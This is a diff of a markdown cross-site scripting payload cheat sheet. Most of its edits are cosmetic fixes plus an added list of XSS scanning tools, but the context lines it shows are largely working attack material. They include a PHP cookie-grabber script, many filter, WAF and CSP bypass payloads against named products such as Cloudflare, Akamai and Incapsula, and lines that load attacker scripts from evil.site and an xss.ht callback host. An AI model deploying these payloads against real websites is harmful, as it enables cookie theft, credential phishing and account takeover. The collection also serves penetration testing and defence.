@@ -2,7 +2,7 @@
 
 Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
 
-## Summary 
+## Summary
 
 - [Exploit code or POC](#exploit-code-or-poc)
   - [Data grabber for XSS](#data-grabber-for-xss)
@@ -63,6 +63,8 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [CSP Bypass](#csp-bypass)
 - [Common WAF Bypass](#common-waf-bypass)
 
+
+
 ## Exploit code or POC
 
 ### Data grabber for XSS
@@ -82,12 +84,12 @@ Write the collected data into a file.
 <?php
 $cookie = $_GET['c'];
 $fp = fopen('cookies.txt', 'a+');
-fwrite($fp, 'Cookie:' .$cookie.'\r\n');
+fwrite($fp, 'Cookie:' .$cookie."\r\n");
 fclose($fp);
 ?>
 ```
 
-### UI redressing 
+### UI redressing
 
 Leverage the XSS to modify the HTML content of the page in order to display a fake login form.
 
@@ -122,6 +124,16 @@ More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all]
 ```javascript
 <script>debugger;</script>
 ```
+
+### Tools 
+
+Most tools are also suitable for blind XSS attacks:
+
+* [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
+* [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
+* [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
+* [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
+* [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester
 
 ## XSS in HTML/Applications
 
@@ -208,7 +220,7 @@ Based on a DOM XSS sink.
 #"><img src=/ onerror=alert(2)>
 ```
 
-### XSS in JS Context 
+### XSS in JS Context
 
 ```javascript
 -(confirm)(document.domain)//
@@ -227,7 +239,7 @@ javascript:prompt(1)
 
 &#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
 
-We can encode the "javacript:" in Hex/Octal
+We can encode the "javascript:" in Hex/Octal
 \x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
 \u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
 \152\141\166\141\163\143\162\151\160\164\072alert(1)
@@ -539,7 +551,7 @@ Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
 ```
 
-### Bypass with incomplete html tag 
+### Bypass with incomplete html tag
 
 Works on IE/Firefox/Chrome/Safari
 
@@ -596,7 +608,7 @@ setTimeout`alert\u0028document.domain\u0029`;
 <script>{onerror=alert}throw 1337</script>
 <script>throw onerror=alert,'some string',123,'haha'</script>
 
-// From @terjanq 
+// From @terjanq
 <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
 
 // From @cgvwzq
@@ -613,7 +625,7 @@ setTimeout`alert\u0028document.domain\u0029`;
 <img src='1' onerror\x00=alert(0) />
 <img src='1' onerror\x0b=alert(0) />
 
-// Bypass onxxx= filter with a '/' 
+// Bypass onxxx= filter with a '/'
 <img src='1' onerror/=alert(0) />
 ```
 
@@ -631,7 +643,7 @@ $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
 ```
 
-### Bypass email filter 
+### Bypass email filter
 
 ([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))
 
@@ -701,7 +713,7 @@ Object.keys(self)[5]
 self[Object.keys(self)[5]]("1") // alert("1")
 ```
 
-We can find "alert" with a regular expression like ^a[rel]+t$ : 
+We can find "alert" with a regular expression like ^a[rel]+t$ :
 
 ```javascript
 a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()
@@ -711,7 +723,7 @@ a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind functio
 self[Object.keys(self)[a()]]("1") // alert("1")
 ```
 
-Oneliner: 
+Oneliner:
 ```javascript
 a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
 ```
@@ -772,7 +784,7 @@ XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
 XSSObject.proxy(window, 'alert', 'window.alert', false);
 ```
 
-### Bypass ">" using nothing 
+### Bypass ">" using nothing
 
 You don't need to close your tags.
 
@@ -780,7 +792,7 @@ You don't need to close your tags.
 <svg onload=alert(1)//
 ```
 
-### Bypass "<" using ＜ 
+### Bypass "<" using ＜
 
 ```javascript
 [̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
@@ -824,7 +836,7 @@ javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!�
 
 ### Bypass using Lontara
 
-```javscript
+```javascript
 ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
 ```
 
@@ -927,7 +939,7 @@ Little Endian : 0xFF 0xFE 0x00 0x00
 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
-### Bypass using weird encoding or native interpretation 
+### Bypass using weird encoding or native interpretation
 
 ```javascript
 <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
@@ -972,7 +984,8 @@ window.frames[0].document.head.appendChild(script);
 ### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
 
 ```js
-d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://yoursubdomain.xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+// CSP Bypass with Inline and Eval
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
 ```
 
 ### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)
@@ -996,25 +1009,25 @@ Works for CSP like `script-src 'self' data:`
 
 ### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
 
-#### 21st april 2020
+#### 21st April 2020
 
 ```html
 <svg/OnLoad="`${prompt``}`">
 ```
 
-#### 22nd august 2019
+#### 22nd August 2019
 
 ```html
 <svg/onload=%26nbsp;alert`bohdan`+
 ```
 
-#### 5th jule 2019
+#### 5th June 2019
 
 ```html
 1'"><img/src/onerror=.1|alert``>
 ```
 
-#### 3rd june 2019
+#### 3rd June 2019
 
 ```html
 <svg onload=prompt%26%230000000040document.domain)>
@@ -1022,19 +1035,19 @@ Works for CSP like `script-src 'self' data:`
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 ```
 
-### Cloudflare XSS Bypass - 22nd march 2019 (by @RakeshMane10)
+### Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)
 
 ```
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
 ```
 
-### Cloudflare XSS Bypass - 27th february 2018
+### Cloudflare XSS Bypass - 27th February 2018
 
 ```html
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
 ```
 
-### Chrome Auditor - 9th august 2018
+### Chrome Auditor - 9th August 2018
 
 ```javascript
 </script><svg><script>alert(1)-%26apos%3B
@@ -1042,7 +1055,7 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 
 Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
 
-### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th march 2018
+### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th March 2018
 
 ```javascript
 anythinglr00</script><script>alert(document.domain)</script>uxldz
@@ -1050,31 +1063,31 @@ anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
 
-### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th september 2018
+### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th September 2018
 
 ```javascript
 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 ```
 
-### Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th may 2019
+### Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th May 2019
 
 ```html
 <svg onload\r\n=$.globalEval("al"+"ert()");>
 ```
 
-### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th june 2018
+### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th June 2018
 
 ```javascript
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
 
-### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th october 2018
+### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th October 2018
 
 ```html
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
 ```
 
-### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th september 2018
+### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th September 2018
 
 ```javascript
 <a href=javas&#99;ript:alert(1)>
@@ -1102,9 +1115,9 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs](https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf)
 - [Sleeping stored Google XSS Awakens a $5000 Bounty](https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/) by Patrik Fehrenbach
 - [RPO that lead to information leakage in Google](http://blog.innerht.ml/rpo-gadgets/) by filedescriptor
-- [God-like XSS, Log-in, Log-out, Log-in](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/) in Uber by Jack Whitton 
-- [Three Stored XSS in Facebook](http://www.breaksec.com/?p=6129) by Nirgoldshlager 
-- [Using a Braun Shaver to Bypass XSS Audit and WAF](https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify) by Frans Rosen  
+- [God-like XSS, Log-in, Log-out, Log-in](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/) in Uber by Jack Whitton
+- [Three Stored XSS in Facebook](http://www.breaksec.com/?p=6129) by Nirgoldshlager
+- [Using a Braun Shaver to Bypass XSS Audit and WAF](https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify) by Frans Rosen
 - [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/) by Jack Whitton
 - [Stored XSS in *.ebay.com](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/) by Jack Whitton
 - [Complicated, Best Report of Google XSS](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss) by Ramzes
@@ -1117,10 +1130,10 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)](http://mksben.l0.cm/2016/07/xxn-caret.html) by Masato Kinugawa
 - [Youtube XSS](https://labs.detectify.com/2015/06/06/google-xss-turkey/) by fransrosen
 - [Best Google XSS again](https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter) - by Krzysztof Kotowicz
-- [IE & Edge URL parsin Problem](https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/) - by detectify
+- [IE & Edge URL parsing Problem](https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/) - by detectify
 - [Google XSS subdomain Clickjacking](http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html)
 - [Microsoft XSS and Twitter XSS](http://blog.wesecureapp.com/xss-by-tossing-cookies/)
-- [Google Japan Book XSS](http://nootropic.me/blog/en/blog/2016/09/20/%E3%82%84%E3%81%AF%E3%82%8A%E3%83%8D%E3%83%83%E3%83%88%E3%82%B5%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%9F%E3%82%89%E3%81%9F%E3%81%BE%E3%81%9F%E3%81%BEgoogle/) 
+- [Google Japan Book XSS](http://nootropic.me/blog/en/blog/2016/09/20/%E3%82%84%E3%81%AF%E3%82%8A%E3%83%8D%E3%83%83%E3%83%88%E3%82%B5%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%9F%E3%82%89%E3%81%9F%E3%81%BE%E3%81%9F%E3%81%BEgoogle/)
 - [Flash XSS mega nz](https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/) - by frans
 - [Flash XSS in multiple libraries](https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/) - by Olivier Beg
 - [xss in google IE, Host Header Reflection](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
@@ -1134,20 +1147,20 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2](http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/) by geekboy
 - [Uber Self XSS to Global XSS](https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html)
 - [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g) by Marin MoulinierFollow
-- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) by Brett 
-- [XSSI, Client Side Brute Force](http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html)  
+- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) by Brett
+- [XSSI, Client Side Brute Force](http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html)
 - [postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
 - [postMessage XSS Bypass](https://hackerone.com/reports/231053)
 - [XSS in Uber via Cookie](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/) by zhchbin
 - [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) by frans
-- [XSS due to improper regex in third party js Uber 7k XSS](http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/) 
+- [XSS due to improper regex in third party js Uber 7k XSS](http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/)
 - [XSS in TinyMCE 2.4.0](https://hackerone.com/reports/262230) by Jelmer de Hen
 - [Pass uncoded URL in IE11 to cause XSS](https://hackerone.com/reports/150179)
-- [Twitter XSS by stopping redirection and javascript scheme](http://blog.blackfan.ru/2017/09/devtwittercom-xss.html) by Sergey Bobrov 
+- [Twitter XSS by stopping redirection and javascript scheme](http://blog.blackfan.ru/2017/09/devtwittercom-xss.html) by Sergey Bobrov
 - [Auth DOM Uber XSS](http://stamone-bug-bounty.blogspot.hk/2017/10/dom-xss-auth_14.html)
 - [Managed Apps and Music: two Google reflected XSSes](https://ysx.me.uk/managed-apps-and-music-a-tale-of-two-xsses-in-google-play/)
 - [App Maker and Colaboratory: two Google stored XSSes](https://ysx.me.uk/app-maker-and-colaboratory-a-stored-google-xss-double-bill/)
-- [XSS in www.yahoo.com](https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be) 
+- [XSS in www.yahoo.com](https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be)
 - [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
 - [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
 - [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
